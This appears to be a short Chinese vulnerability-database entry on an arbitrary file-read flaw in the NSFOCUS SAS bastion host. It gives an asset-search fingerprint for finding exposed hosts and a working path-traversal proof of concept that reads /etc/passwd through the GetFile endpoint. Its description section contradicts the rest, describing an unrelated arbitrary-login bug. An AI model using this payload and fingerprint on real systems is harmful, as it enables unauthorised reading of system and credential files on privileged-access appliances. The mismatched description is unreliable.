# 绿盟 SAS堡垒机 GetFile 任意文件读取漏洞

## 漏洞描述

绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录

## 漏洞影响

<a-checkbox checked>绿盟 SAS堡垒机</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="'/needUsbkey.php?username='"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1687843929584-e793a136-93ec-4b19-8ee9-5738c91681e8.png)

漏洞存在于文件 GetFileController.php 文件中

![img](../../../.vuepress/public/img/1691645164688-78430d67-4ce1-4d26-8854-5d330b034c5e.png)

验证POC

```plain
/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
```

![image.png](../../../.vuepress/public/img/1688361725621-1d85a406-2f2c-492a-8c0f-5d54ea282f2a.png)